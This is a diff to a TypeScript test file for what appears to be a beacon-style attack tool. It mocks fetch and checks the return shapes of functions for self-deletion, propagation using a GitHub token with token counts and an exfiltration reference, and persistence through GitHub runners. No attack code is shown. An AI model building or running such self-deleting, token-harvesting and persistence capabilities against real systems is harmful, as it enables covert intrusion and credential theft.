@@ -57,6 +57,15 @@ describe("selfDelete", () => {
     expect(typeof result).toBe("string");
     expect(result.length).toBeGreaterThan(0);
   });
+
+  it("prefers argv[1] over execPath to avoid deleting the runtime interpreter", async () => {
+    const origArgv1 = process.argv[1];
+    process.argv[1] = "/tmp/fake-beacon-script";
+    const result = await selfDelete();
+    // Should reference argv[1] in the result message
+    expect(result).toContain("fake-beacon-script");
+    process.argv[1] = origArgv1;
+  });
 });
 
 describe("propagate", () => {
@@ -67,11 +76,10 @@ describe("propagate", () => {
   });
 
   it("returns a PropagateResult shape", async () => {
-    // Mock fetch to avoid real API calls
     const origFetch = globalThis.fetch;
-    globalThis.fetch = async () => ({ ok: false, status: 403, json: async () => ({}) } as any);
+    (globalThis as any).fetch = async () => ({ ok: false, status: 403, json: async () => ({}) });
     const result = await propagate("ghp_fake", "testowner", "testrepo");
-    globalThis.fetch = origFetch;
+    (globalThis as any).fetch = origFetch;
     expect(typeof result.tokensFound).toBe("number");
     expect(typeof result.exfilRef).toBe("string");
     expect(Array.isArray(result.techniques)).toBe(true);
@@ -81,9 +89,9 @@ describe("propagate", () => {
 describe("installPersistence", () => {
   it("gh-runner returns PersistenceResult", async () => {
     const origFetch = globalThis.fetch;
-    globalThis.fetch = async () => ({ ok: false, status: 403 } as any);
+    (globalThis as any).fetch = async () => ({ ok: false, status: 403 });
     const result = await installPersistence("gh-runner");
-    globalThis.fetch = origFetch;
+    (globalThis as any).fetch = origFetch;
     expect(typeof result.method).toBe("string");
     expect(typeof result.success).toBe("boolean");
     expect(typeof result.detail).toBe("string");
@@ -91,9 +99,9 @@ describe("installPersistence", () => {
 
   it("gh-runner-register is an alias for gh-runner", async () => {
     const origFetch = globalThis.fetch;
-    globalThis.fetch = async () => ({ ok: false, status: 403 } as any);
+    (globalThis as any).fetch = async () => ({ ok: false, status: 403 });
     const result = await installPersistence("gh-runner-register");
-    globalThis.fetch = origFetch;
+    (globalThis as any).fetch = origFetch;
     expect(result.method).toBe("gh-runner");
     expect(typeof result.success).toBe("boolean");
   });
